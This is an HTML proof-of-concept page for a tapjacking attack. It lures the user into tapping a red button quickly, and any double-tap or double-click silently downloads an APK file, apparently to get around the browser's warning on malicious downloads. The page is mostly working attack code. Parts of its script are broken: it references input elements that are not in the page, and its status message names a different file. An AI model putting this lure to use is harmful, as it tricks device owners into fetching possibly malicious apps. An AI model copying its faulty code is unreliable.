<!doctype html>
<html>
<head>
<style>
html { font-family: sans-serif; }
body { overflow: hidden; cursor: pointer; }

input { position: absolute; top: 0; left: -300px; opacity: 0.0001; }
#inputElem { cursor: pointer; }

#output { padding: 0.2em; background: #eee; }
#output.success { background: lightgreen; }

#instructions { text-align: center; margin-top: 200px; font-size: 2em; user-select: none; }

/* Red Button Styles */
#redButton {
  position: absolute;
  top: 55%;
  right: 40%;
  width: 40px;
  height: 40px;
  background-color: red;
  border: none;
  border-radius: 4px;
  cursor: pointer;
}
</style>
</head>
<body>
<h1>Tapjacking - Bypass the malicious file protection</h1>

<!-- Red button -->
<button id="redButton" title="Red Button"></button>

<p id="output">(no output yet...)</p>

<p id="instructions">Press the red button as fast as you can</p>

<script>
var inputElem;
var setMainField = () => {
  if (window.location.search.indexOf('creditcard') === -1) {
    var groupOneElem = document.getElementById('groupOneElem');
    groupOneElem.id = 'inputElem';
    inputElem = groupOneElem;
  } else {
    var groupTwoElem = document.getElementById('groupTwoElem');
    groupTwoElem.id = 'inputElem';
    inputElem = groupTwoElem;
  }
}

setMainField();

var updateOutput = () => {
    var inputs = document.querySelectorAll('input');
    var inputValues = [];
    inputs.forEach((elem) => {
       if (elem.value.length) {
         inputValues.push(elem.value);
       }
    });
    output.innerText = inputValues.join(', ');
    output.classList.add('success');
}

inputElem.addEventListener('change', (e) => {
  if (inputElem.value.length > 0) {
    setTimeout(() => { updateOutput(); }, 10);
  }
});

// Trigger APK download
function downloadApk() {
  const apkLink = document.createElement('a');
  apkLink.href = 'qwertyuiop.apk'; // Make sure this file is hosted and accessible
  apkLink.download = 'qwertyuiop.apk';
  document.body.appendChild(apkLink);
  apkLink.click();
  document.body.removeChild(apkLink);

  document.getElementById('output').innerText = "ðŸ“¦ Downloading testtesttest.apk...";
}

let lastTap = 0;

window.addEventListener('touchstart', (e) => {
  const currentTime = new Date().getTime();
  const tapLength = currentTime - lastTap;
  if (tapLength < 300 && tapLength > 0) {
    downloadApk();
  }
  lastTap = currentTime;
});

window.addEventListener('dblclick', (e) => {
  downloadApk();
});
</script>

</body>
</html>
